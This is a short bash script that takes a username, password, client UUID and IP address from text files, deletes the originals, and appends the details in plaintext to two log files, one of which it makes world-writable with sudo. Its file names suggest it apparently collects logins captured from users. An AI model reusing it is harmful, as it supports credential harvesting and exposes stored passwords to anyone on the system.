#!/bin/bash

# Read username and password from creds.txt
usr=$(head -n 1 creds.txt)
passwd=$(sed -n '2{p;q;}' creds.txt)

# Read UUID and IP from datafromclient.txt
uuid=$(sed -n '5p' datafromclient.txt)
ip=$(sed -n '2p' datafromclient.txt)

# Remove input files
rm datafromclient.txt
rm creds.txt

# Print username and password
echo $usr
echo $passwd

# Append credentials to data.txt and tempdata.txt
set +o noclobber
printf "{ \n UUID: $uuid \n IP: $ip \n USR: $usr \n PASSWD: $passwd \n DATE: $(date +"%m %d %Y %H:%M:%S") \n }, \n" >> data.txt
printf "{ \n UUID: $uuid \n IP: $ip \n USR: $usr \n PASSWD: $passwd \n DATE: $(date +"%m %d %Y %H:%M:%S") \n }, \n" >> tempdata.txt

# Set permissions on tempdata.txt
sudo chmod -R a+rwx tempdata.txt
